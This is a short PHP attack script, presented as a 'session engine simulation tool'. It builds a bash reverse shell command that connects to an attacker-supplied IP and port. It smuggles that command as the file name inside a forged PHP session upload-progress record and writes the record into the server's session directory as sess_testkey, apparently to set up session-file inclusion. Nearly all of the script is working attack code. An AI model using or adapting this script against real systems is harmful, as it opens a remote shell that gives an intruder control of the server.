<?php
/**
 * Session Upload Progress Generator & Writer
 * Based on php-src/ext/session/session.c serialization mechanics
 * made by Taylor Christian Newsome
 */

// Configuration
$attacker_ip   = isset($argv[1]) ? $argv[1] : "10.10.14.x";
$attacker_port = isset($argv[2]) ? $argv[2] : "4444";
$session_key   = "testkey";

// 1. Build the reverse shell command using single quotes
$cmd = "nohup bash -c 'bash -i >& /dev/tcp/" . $attacker_ip . "/" . $attacker_port . " 0>&1' >/dev/null 2>&1 &";

// 2. Calculate exact byte-length for PHP serialization precision (s:XX:)
$cmd_length = strlen($cmd);

// 3. Construct the serialized session upload progress template
$session_data = 'upload_progress_' . $session_key . '|a:5:{s:10:"start_time";i:' . time() . ';s:14:"content_length";i:1000;s:15:"bytes_processed";i:1000;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:' . $cmd_length . ':"' . $cmd . '";s:8:"tmp_name";s:0:"";s:5:"error";i:0;s:4:"done";b:1;s:9:"start_time";i:1700000000;s:15:"bytes_processed";i:1000;}}}';

// 4. Resolve the system session save path (matching session.c default storage behavior)
$session_path = session_save_path();
if (empty($session_path)) {
    $session_path = sys_get_temp_dir();
}

$session_file = rtrim($session_path, '/') . '/sess_' . $session_key;

echo "========================================\n";
echo " PHP Session Engine Simulation Tool     \n";
echo " made by Taylor Christian Newsome       \n";
echo "========================================\n\n";
echo "[*] Target Session File: {$session_file}\n";
echo "[*] Payload Length:      {$cmd_length} bytes\n";

// 5. Write the session data directly to the storage path
if (file_put_contents($session_file, $session_data) !== false) {
    echo "[+] Session file successfully written and structured!\n";
} else {
    echo "[-] Error: Unable to write to session directory. Check permissions.\n";
}
?>
